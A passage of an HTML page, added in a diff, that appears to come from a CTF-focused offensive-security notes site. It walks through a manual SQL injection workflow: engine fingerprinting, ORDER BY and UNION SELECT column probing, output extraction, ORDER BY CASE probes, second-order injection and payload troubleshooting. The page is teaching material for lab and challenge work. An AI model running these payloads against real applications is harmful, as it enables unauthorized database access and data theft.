+      </tr>
+      <tr>
+          <td><code>SQLite</code>, <code>sqlite3</code>, <code>no such table</code>, <code>near ... syntax error</code></td>
+          <td>SQLite; generic fragments need corroboration</td>
+          <td><code>sqlite_version()</code></td>
+      </tr>
+      <tr>
+          <td><code>Unclosed quotation mark</code>, <code>SQL Server</code>, <code>ODBC Driver ... SQL Server</code></td>
+          <td>SQL Server</td>
+          <td><code>@@VERSION</code> and <code>DB_NAME()</code></td>
+      </tr>
+      <tr>
+          <td><code>ORA-01756</code>, <code>ORA-00933</code>, <code>ORA-00942</code></td>
+          <td>Oracle</td>
+          <td><code>banner FROM v$version</code>, or <code>USER FROM dual</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>Blind corroboration examples after finding the right quoting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> sqlite_version<span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">IS</span> <span style="color:#81a1c1;font-weight:bold">NOT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> current_database<span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">IS</span> <span style="color:#81a1c1;font-weight:bold">NOT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> DB_NAME<span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">IS</span> <span style="color:#81a1c1;font-weight:bold">NOT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">DATABASE</span><span style="color:#eceff4">()</span> <span style="color:#81a1c1;font-weight:bold">IS</span> <span style="color:#81a1c1;font-weight:bold">NOT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span></span></span></code></pre></div><p><code>version()</code> works on both MySQL and PostgreSQL. <code>@@version</code> works on MySQL and SQL Server. A successful shared function is not a unique fingerprint. Read the returned text or pair with engine-specific behavior.</p>
+<h2 id="4-does-the-query-return-rows-into-the-response">4. Does the query return rows into the response?<a class="anchor" href="#4-does-the-query-return-rows-into-the-response"></a></h2>
+<h3 id="count-selected-columns">Count selected columns<a class="anchor" href="#count-selected-columns"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span><span style="color:#a3be8c">&#39; ORDER BY 1-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">1&#39;</span> <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> <span style="color:#b48ead">2</span><span style="color:#616e87;font-style:italic">-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span><span style="color:#a3be8c">&#39; ORDER BY 3-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">1&#39;</span> <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> <span style="color:#b48ead">4</span><span style="color:#616e87;font-style:italic">-- -</span></span></span></code></pre></div><p>If 3 works and 4 fails with a position error, try three columns. A hidden error or an unrelated type error makes this inconclusive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>no_such_value<span style="color:#a3be8c">&#39; UNION SELECT NULL-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">no_such_value&#39;</span> <span style="color:#81a1c1;font-weight:bold">UNION</span> <span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span><span style="color:#eceff4">,</span><span style="color:#81a1c1;font-weight:bold">NULL</span><span style="color:#616e87;font-style:italic">-- -
+</span></span></span><span style="display:flex;"><span>no_such_value<span style="color:#a3be8c">&#39; UNION SELECT NULL,NULL,NULL-- -</span></span></span></code></pre></div><p>Oracle adaptation: <code>UNION SELECT NULL,NULL,NULL FROM dual</code>. Use a false original condition/value so original rows do not hide the injected row.</p>
+<h3 id="find-a-displayed-text-compatible-column">Find a displayed text-compatible column<a class="anchor" href="#find-a-displayed-text-compatible-column"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>no_such_value<span style="color:#a3be8c">&#39; UNION SELECT &#39;</span>CTFMARK<span style="color:#a3be8c">&#39;,NULL,NULL-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">no_such_value&#39;</span> <span style="color:#81a1c1;font-weight:bold">UNION</span> <span style="color:#81a1c1;font-weight:bold">SELECT</span> <span style="color:#81a1c1;font-weight:bold">NULL</span><span style="color:#eceff4">,</span><span style="color:#a3be8c">&#39;CTFMARK&#39;</span><span style="color:#eceff4">,</span><span style="color:#81a1c1;font-weight:bold">NULL</span><span style="color:#616e87;font-style:italic">-- -
+</span></span></span><span style="display:flex;"><span>no_such_value<span style="color:#a3be8c">&#39; UNION SELECT NULL,NULL,&#39;</span>CTFMARK<span style="color:#a3be8c">&#39;-- -</span></span></span></code></pre></div><p>Change one position at a time. An integer column may reject a string on PostgreSQL, SQL Server, or Oracle. <code>NULL</code> is often a better starting placeholder than integers. The app may render only the first row or a particular field.</p>
+<h3 id="put-the-engine-expression-in-that-position">Put the engine expression in that position<a class="anchor" href="#put-the-engine-expression-in-that-position"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>no_such_value<span style="color:#a3be8c">&#39; UNION SELECT NULL,sqlite_version(),NULL-- -</span></span></span></code></pre></div><p>Now follow the matching page:</p>
+<p><strong><a href="../sqli-mysql/">MySQL</a> · <a href="../sqli-postgresql/">PostgreSQL</a> · <a href="../sqli-sqlite/">SQLite</a> · <a href="../sqli-mssql/">SQL Server</a> · <a href="../sqli-oracle/">Oracle</a></strong></p>
+<h2 id="5-no-visible-output">5. No visible output?<a class="anchor" href="#5-no-visible-output"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Signal</th>
+          <th>Next action</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Rows / JSON fields displayed</td>
+          <td>UNION read</td>
+      </tr>
+      <tr>
+          <td>A stable true/false page difference</td>
+          <td>Boolean extraction</td>
+      </tr>
+      <tr>
+          <td>Detailed DB error body</td>
+          <td>Error-based extraction if supported</td>
+      </tr>
+      <tr>
+          <td>Only repeatable conditional delay</td>
+          <td>Time-based extraction</td>
+      </tr>
+      <tr>
+          <td>Immediate request looks safe, later export fails</td>
+          <td>Second-order injection</td>
+      </tr>
+  </tbody>
+</table>
+<p>Continue with <a href="../sqli-blind/">blind / error SQLi</a>. Stacked queries depend on both the database and the application driver. A database supporting semicolons does not mean the application accepts multiple statements.</p>
+<h2 id="6-nonstandard-insertion-points">6. Nonstandard insertion points<a class="anchor" href="#6-nonstandard-insertion-points"></a></h2>
+<h3 id="order-by">ORDER BY<a class="anchor" href="#order-by"></a></h3>
+<p>If source shows an unquoted sort expression and you can observe the first row:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">CASE</span> <span style="color:#81a1c1;font-weight:bold">WHEN</span> <span style="color:#eceff4">(</span><span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">THEN</span> name <span style="color:#81a1c1;font-weight:bold">ELSE</span> id <span style="color:#81a1c1;font-weight:bold">END</span>
+</span></span><span style="display:flex;"><span><span style="color:#81a1c1;font-weight:bold">CASE</span> <span style="color:#81a1c1;font-weight:bold">WHEN</span> <span style="color:#eceff4">(</span><span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">2</span><span style="color:#eceff4">)</span> <span style="color:#81a1c1;font-weight:bold">THEN</span> name <span style="color:#81a1c1;font-weight:bold">ELSE</span> id <span style="color:#81a1c1;font-weight:bold">END</span></span></span></code></pre></div><p>This depends on compatible types; use two same-type columns or engine-appropriate casts. An allowlisted column name prevents this. A trailing UNION usually does not fit this position.</p>
+<h3 id="like-wildcard-behavior">LIKE wildcard behavior<a class="anchor" href="#like-wildcard-behavior"></a></h3>
+<p><code>%</code> matches multiple characters and <code>_</code> matches one in SQL LIKE patterns. Broadening search using <code>%</code> alone can be normal intended wildcard behavior; it does not establish SQL syntax injection.</p>
+<h3 id="second-order">Second order<a class="anchor" href="#second-order"></a></h3>
+<p>Store a unique quote-bearing marker in a profile/product/name, then exercise reports, exports, searches, admin pages, and jobs that reuse it. Record the downstream request that actually executes the query. An escaped INSERT does not protect a later string-built SELECT.</p>
+<h2 id="if-the-payload-fails">If the payload fails<a class="anchor" href="#if-the-payload-fails"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Symptom</th>
+          <th>Check next</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>near UNION</code> / unexpected <code>)</code></td>
+          <td>String/parenthesis closure</td>
+      </tr>
+      <tr>
+          <td>Column-count error</td>
+          <td>UNION column count</td>
+      </tr>
+      <tr>
+          <td>Type conversion error</td>
+          <td>Text-compatible slot / explicit cast</td>
+      </tr>
+      <tr>
+          <td>No injected row</td>
+          <td>Original result ordering, renderer, negative base value</td>
+      </tr>
+      <tr>
+          <td>Comment appears ineffective</td>
+          <td>MySQL trailing space, stripped whitespace, newline, URL encoding</td>
+      </tr>
+      <tr>
+          <td>Same page for true/false</td>
+          <td>Wrong parameter, missing session, no baseline row, cached response</td>
+      </tr>
+      <tr>
+          <td>Blocked keywords</td>
+          <td><a href="../encoding-filters/">Encoding / filter transformations</a></td>
+      </tr>
+  </tbody>
+</table>
+<p>Reference: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQLi syntax comparison</a>. Use it to cross-check syntax; the sequence here is a manual decision workflow.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/methodology/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>00 · First 10 Minutes</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/sqli-mysql/" class="flex align-center">
+        <span>02 · SQLi — MySQL / MariaDB</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-what-does-your-input-sit-inside">1. What does your input sit inside?</a></li>
+    <li><a href="#2-confirm-injection">2. Confirm injection</a>
+      <ul>
+        <li><a href="#numeric-value">Numeric value</a></li>
+        <li><a href="#single-quoted-string">Single-quoted string</a></li>
+        <li><a href="#authentication-query-if-the-challenge-gate-is-a-vulnerable-login">Authentication query, if the challenge gate is a vulnerable login</a></li>
+        <li><a href="#comment-syntax">Comment syntax</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-identify-the-database">3. Identify the database</a></li>
+    <li><a href="#4-does-the-query-return-rows-into-the-response">4. Does the query return rows into the response?</a>
+      <ul>
+        <li><a href="#count-selected-columns">Count selected columns</a></li>
+        <li><a href="#find-a-displayed-text-compatible-column">Find a displayed text-compatible column</a></li>
+        <li><a href="#put-the-engine-expression-in-that-position">Put the engine expression in that position</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-no-visible-output">5. No visible output?</a></li>
+    <li><a href="#6-nonstandard-insertion-points">6. Nonstandard insertion points</a>
+      <ul>
+        <li><a href="#order-by">ORDER BY</a></li>
+        <li><a href="#like-wildcard-behavior">LIKE wildcard behavior</a></li>
+        <li><a href="#second-order">Second order</a></li>
+      </ul>
+    </li>
+    <li><a href="#if-the-payload-fails">If the payload fails</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
